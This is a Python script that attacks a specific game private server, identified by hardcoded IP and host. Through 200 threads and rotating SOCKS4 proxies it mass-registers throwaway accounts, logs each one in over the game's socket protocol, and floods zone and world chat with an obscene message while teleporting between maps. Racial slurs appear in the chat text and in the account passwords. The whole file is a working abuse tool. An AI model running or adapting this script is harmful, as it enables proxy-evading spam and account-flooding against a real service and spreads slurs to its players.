import sys
import socks
import time
import threading
import string
import random
import ssl
import os
import hashlib
import requests

ip="192.3.189.148"
port=80
host="ravenaq.net"
urllogin="http://192.3.189.148/game/cf-userlogin.asp"
urlsignup="game/cf-usersignup.asp"
referersignup="http://ravenaq.net/game/gamefiles/newuser/AQW-Landing-19May16.swf"
refererlogin="https://ravenaq.net/game/gamefiles/Game_Live_01022020r2.swf"
emuport=5588
proxyfile="socks4_proxies.txt"
map="faroff"
map2="yulgar"
emotetouse="dance"
tftv=1
messagechat="fr0g0 is da best eat me penis shit sk1ds"
threads=200

moveenterspawn="%xt%zm%moveToCell%0%Enter%Spawn%\x00"
retreivedatas="%xt%zm%retrieveUserDatas%0%0%\x00"
retreiveinv="%xt%zm%retrieveInventory%0%0%\x00"
firstjoin="%xt%zm%firstJoin%1%\x00"
gar="%xt%zm%gar%0%0%aa>m:1%wvz%\x00"

def emote(emotetouse, s):
 s.send("%xt%zm%emotea%1%{}%\x00".format(emotetouse))
 time.sleep(1)

def tfter(randuser, where, s):
 tft="%xt%zm%cmd%1%tfer%{}%{}%\x00".format(randuser, where)
 s.send(tft)
 time.sleep(1)

def tftv2(randuser, where, s):
 s.send("%xt%zm%cmd%0%tfer%{}%{}%Enter%Spawn%".format(randuser, where))
 time.sleep(1)

def msg(content, s):
 msg="%xt%zm%message%0%{}%zone%\x00".format(content)
 s.send(msg)
 time.sleep(1)

def msgworld(content, s):
 msg="%xt%zm%message%0%{}%world%\x00".format(content)
 s.send(msg)
 time.sleep(1)

def movetocell(cell, pad, s):
 msg="%xt%zm%moveToCell%0%{}%{}%\x00".format(cell, pad)
 s.send(msg)
 time.sleep(1)

def randmove(s):
 s.send("%xt%zm%mv%{}%680%288%8%\x00".format(random.randint(1, 3000)))
 time.sleep(1)

def attack(s):
 s.send(gar)
 time.sleep(1)

def join_flow(s, randuser):
 time.sleep(1)
 s.send(retreivedatas)
 print(retreivedatas)
 s.recv(1024)
 time.sleep(1)
 s.send(retreiveinv)
 print(retreiveinv)
 s.recv(1024)
 time.sleep(1)
 s.send(moveenterspawn)
 print(moveenterspawn)
 s.recv(1024)
 time.sleep(1)
 if tftv==1:
  tfter(randuser, map, s)
 else:
  tftv2(randuser, map, s)
 while True:
  msg(messagechat, s)
  time.sleep(5)
  msgworld(messagechat, s)
  time.sleep(5)
  if tftv==1:
   tfter(randuser, map2, s)
  else:
   tftv2(randuser, map2, s)

def emu_login(randuser, hash, proxycurr): 
 try:
  s=socks.socksocket()
  s.setproxy(socks.SOCKS4, proxycurr[0], int(proxycurr[1]))
  s.connect((ip, emuport))
  print(s.recv(1024))
  req = "<msg t=\'sys\'><body action=\'login\' r=\'0\'><login z=\'zone_master\'><nick><![CDATA[N7B5W8W1Y5B1R5VWVZ~{}]]></nick><pword><![CDATA[{}]]></pword></login></body></msg>\x00".format(randuser, hash)
  s.send(req)
  print(s.recv(1024))
  time.sleep(1)
  s.send(firstjoin)
  print(s.recv(1024))
  time.sleep(1)
  join_flow(s, randuser)
  s.close()
 except Exception as error: 
  print(error)

def make_req(): 
 randuser = "".join(random.choice(string.ascii_lowercase) for _ in range(random.randint(8,10)))
 reqsignup = "strEmail={}%40gmail%2Ecom&intAge=13&intColorSkin=15388042&ClassID=2&strDOB=1%2F29%2F2007&intColorHair=61806&strPassword=nigga123&strGender=M&intColorEye=91294&HairID=52&strUsername={}".format(randuser, randuser)
 req = "POST /{} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\nReferer: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: */*\r\nConnection: close\r\nContent-Length: {}\r\n\r\n{}".format(urlsignup, host, referersignup, len(reqsignup), reqsignup)
 arr=[
  req,
  randuser
 ]  
 return arr

def gethash(randuser):
 url=urllogin
 data="pwd=asdasd123&pass=nigga123&unm={}&user={}".format(randuser, randuser)
 headers={
  'Host':host,
  'Referer': refererlogin,
  'Content-Type': 'application/x-www-form-urlencoded'
 }
 r=requests.post(url=url, data=data, headers=headers)
 print(r.text)
 hash=r.text.split("sToken=")[1]
 hash=hash.split("\"")[1]
 print(hash)
 return hash 

def spam_reqs():
 try:
  req = make_req()
  s = socks.socksocket()
  proxycurr = random.choice(proxylist).split(":")
  s.setproxy(socks.SOCKS4, proxycurr[0], int(proxycurr[1]))
  s.settimeout(10)
  s.connect((ip, port))
  if int(port) == 443:
   s = ssl.wrap_socket(s)
  s.send(req[0])
  print(req[0])
  resp=s.recv(1024)
  s.close()
  time.sleep(1)
  print(resp)
  if "Success" in resp:
   hash=gethash(req[1])
   emu_login(req[1], hash, proxycurr)
 except Exception as error:
  print(error)

def threads_start(): 
 while True:
  spam_reqs()

with open(proxyfile, "r") as file:
 proxylist=file.read().splitlines()
 file.close()
for i in range(threads):
 t = threading.Thread(target=threads_start)
 t.start()
while True:
 pass

